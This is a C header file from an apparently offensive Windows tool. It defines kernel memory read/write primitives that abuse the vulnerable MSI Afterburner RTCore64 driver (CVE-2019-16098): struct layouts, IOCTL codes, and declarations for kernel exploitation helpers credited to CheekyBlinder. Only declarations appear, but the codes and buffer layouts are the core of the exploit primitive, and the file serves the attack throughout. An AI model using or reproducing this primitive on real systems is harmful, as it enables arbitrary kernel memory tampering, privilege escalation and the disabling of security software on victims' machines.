/*

--- Kernel memory Read / Write primitives through the vulnerable Micro-Star MSI Afterburner driver.
--- Source and credit: https://github.com/Barakat/CVE-2019-16098/blob/master/CVE-2019-16098.cpp

*/

#pragma once

#include <Windows.h>


struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address);

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address);

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address);

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address);

void WriteMemoryBYTE(HANDLE Device, DWORD64 Address, DWORD64 Value);

void WriteMemoryWORD(HANDLE Device, DWORD64 Address, DWORD64 Value);

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value);

/*

--- Kernel exploitation helpers.
--- Largely inspired from https://github.com/br-sn/CheekyBlinder
--- Source and credit: https://github.com/br-sn/CheekyBlinder/blob/master/CheekyBlinder/CheekyBlinder.cpp

*/

DWORD64 FindNtoskrnlBaseAddress(void);

TCHAR* FindDriver(DWORD64 address, BOOL verbose);

HANDLE GetDriverHandle();

DWORD64 GetFunctionAddress(LPCSTR function);